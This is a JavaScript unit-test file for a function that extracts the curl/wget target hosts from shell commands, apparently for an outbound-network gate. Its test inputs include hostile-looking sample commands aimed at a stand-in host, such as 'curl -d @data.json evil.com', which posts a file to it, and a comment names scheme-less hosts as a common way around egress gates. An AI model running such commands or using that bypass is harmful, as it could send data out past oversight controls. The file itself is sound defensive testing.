import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { extractHostsFromCommand } from "./extract.js";

describe("extractHostsFromCommand", () => {
  it("extracts hosts from explicit http(s) URLs", () => {
    assert.deepEqual(extractHostsFromCommand("curl https://api.acme.com/v1/x"), ["api.acme.com"]);
    assert.deepEqual(extractHostsFromCommand("wget http://cdn.acme.io/pkg.tgz"), ["cdn.acme.io"]);
  });

  it("dedups, sorts, and lowercases across multiple URLs", () => {
    const hosts = extractHostsFromCommand(
      "curl https://B.example.com && curl https://a.example.com https://b.example.com/x",
    );
    assert.deepEqual(hosts, ["a.example.com", "b.example.com"]);
  });

  it("handles URLs with ports, auth, and query strings (hostname only)", () => {
    assert.deepEqual(extractHostsFromCommand("curl https://user:pw@api.acme.com:8443/x?y=1"), [
      "api.acme.com",
    ]);
  });

  it("is conservative: bare hostnames and non-http schemes are NOT network targets", () => {
    assert.deepEqual(extractHostsFromCommand("ping api.acme.com"), []);
    assert.deepEqual(extractHostsFromCommand("git clone ssh://git@github.com/x/y.git"), []);
    assert.deepEqual(extractHostsFromCommand("npm test"), []);
  });

  it("stops URL capture at shell delimiters (quotes/brackets/semicolons)", () => {
    assert.deepEqual(extractHostsFromCommand(`curl "https://api.acme.com/x";echo done`), [
      "api.acme.com",
    ]);
  });

  it("is pure/deterministic — same command, same hosts", () => {
    const cmd = "curl https://x.io https://y.io";
    assert.deepEqual(extractHostsFromCommand(cmd), extractHostsFromCommand(cmd));
  });

  // Pass 2: scheme-less hosts passed positionally to curl/wget (the common egress-gate bypass).
  it("extracts a scheme-less host given positionally to curl/wget", () => {
    assert.deepEqual(extractHostsFromCommand("curl evil.com"), ["evil.com"]);
    assert.deepEqual(extractHostsFromCommand("wget evil.com/pkg.tgz"), ["evil.com"]);
    assert.deepEqual(extractHostsFromCommand("curl -sL example.org/x"), ["example.org"]);
    assert.deepEqual(extractHostsFromCommand("nc example.net 443"), []); // nc is not a fetch tool
  });

  it("finds the fetch tool even when it is not the first token", () => {
    assert.deepEqual(extractHostsFromCommand("sudo curl evil.com"), ["evil.com"]);
  });

  it("does NOT mistake value-flag arguments for hosts (no false positives)", () => {
    // -o's value is a filename that looks host-shaped; only the real target must be extracted.
    assert.deepEqual(extractHostsFromCommand("curl -o out.html https://api.acme.com"), [
      "api.acme.com",
    ]);
    assert.deepEqual(extractHostsFromCommand("curl -d @data.json evil.com"), ["evil.com"]);
    assert.deepEqual(
      extractHostsFromCommand(`curl -H "Accept: application/json" https://api.acme.com`),
      ["api.acme.com"],
    );
    assert.deepEqual(extractHostsFromCommand("wget -P out.dir https://cdn.acme.io/p"), [
      "cdn.acme.io",
    ]);
  });

  it("does not bleed across shell separators (only curl/wget segments contribute)", () => {
    // `rm b.com` must not yield a host — rm is not a fetch tool.
    assert.deepEqual(extractHostsFromCommand("curl a.com && rm b.com"), ["a.com"]);
    assert.deepEqual(extractHostsFromCommand("echo evil.com | curl good.com"), ["good.com"]);
  });

  it("ignores schemeless targets without a dotted domain (localhost, bare words)", () => {
    assert.deepEqual(extractHostsFromCommand("curl localhost:3000/health"), []);
    assert.deepEqual(extractHostsFromCommand("curl -X POST myservice/health"), []);
  });

  it("merges explicit-URL and scheme-less hosts, deduped and sorted", () => {
    assert.deepEqual(extractHostsFromCommand("curl https://a.com b.com a.com"), ["a.com", "b.com"]);
  });
});
